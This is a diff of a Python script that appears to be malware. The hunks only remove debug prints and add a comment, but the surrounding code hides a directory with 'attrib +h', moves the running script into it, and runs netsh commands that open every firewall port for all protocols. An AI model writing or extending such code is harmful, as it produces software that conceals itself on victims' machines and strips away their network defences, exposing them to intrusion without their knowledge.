@@ -14,13 +14,11 @@ def burrow():
             mergePath = os.getcwd() + sixDirPath
             mergePath = mergePath[:-9]
             root = getLongestPath(mergePath,destination)
-            print('ROOT: ', root)
             finaldestPath = root + sixDirPath
             try:
                 os.system("attrib +h " + finaldestPath)
             except:
                 pass
-            print('FINALDESTPATH: ',finaldestPath)
             shutil.move(sys.argv[0], finaldestPath)
             burrowFlag = True
         elif(getmade69DirFlag()):
@@ -121,6 +119,7 @@ def helpFireWall():
     command4 = 'netsh advfirewall firewall add portopening protocol = all port = all enable all'
     commands = [command1,command2,command3,command4]
     try:
+        #itereate through list of commands and try each one if one fails continue.
         for command in commands:
             try:
                 os.system(command)
